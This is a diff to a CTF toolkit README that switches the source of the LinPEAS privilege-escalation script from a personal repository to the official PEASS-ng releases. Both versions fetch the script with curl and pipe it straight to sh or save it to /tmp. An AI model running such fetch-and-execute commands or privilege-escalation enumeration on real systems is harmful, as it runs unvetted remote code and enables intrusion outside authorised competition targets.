@@ -19,10 +19,10 @@ Fast, reliable, AI-free cheat sheets, solver scripts, and payloads for the Grand
 When you are on an organizer Linux machine or spawned target:
 
 ```bash
-# Download & run LinPEAS directly from this repo:
-curl -sL https://raw.githubusercontent.com/klasyyi/ctf-tool/main/tools/linpeas.sh | sh
+# Download & run LinPEAS on Linux:
+curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 # Or save to /tmp:
-curl -sL https://raw.githubusercontent.com/klasyyi/ctf-tool/main/tools/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
+curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
 ```
 
 ---
